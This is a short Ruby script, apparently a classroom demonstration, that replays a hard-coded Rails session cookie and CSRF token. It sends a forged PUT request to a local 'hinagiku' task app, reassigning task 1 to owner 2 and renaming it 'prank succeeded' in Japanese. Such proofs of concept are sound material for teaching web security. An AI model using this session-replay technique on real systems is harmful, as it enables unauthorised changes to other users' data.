# encoding: utf-8

require "net/http"

CSRF_TOKEN = "1Dg5ShUInH3RnyGgVsVzG8qwlqsX87gnhpgL4Ysl4+c="
SESSION_DATA = "BAh7CCIQX2NzcmZfdG9rZW4iMTFEZzVTaFVJbkgzUm55R2dWc1Z6Rzhxd2xxc1g4N2duaHBnTDRZc2w0K2M9Ig9zZXNzaW9uX2lkIiVkODgyMDA3YmUzMWIwNzExMDdiOTcwNmIzMzI0NTczZiIMdXNlcl9pZGkG--dd22fbb099a5c439df17f99ffebc699e19bdfe96"

params = {
  "utf8" => "&#x2713;",
  "_method" => 'put',
  "authenticity_token" => CSRF_TOKEN,
  "task[owner_id]" => "2",
  "task[name]" => "いたずら成功",
  "task[category_id]" => "",
  "task[done]" => "0",
  "task[description]" => ""
}

cookie_data = "_hinagiku_session=#{SESSION_DATA};"

uri = URI.parse("http://localhost:3000/tasks/1")
req = Net::HTTP::Post.new(uri.path)
req.set_form_data(params)
req.add_field("Cookie", cookie_data)

Net::HTTP.new(uri.host, uri.port).start do |http|
  http.request(req)
end
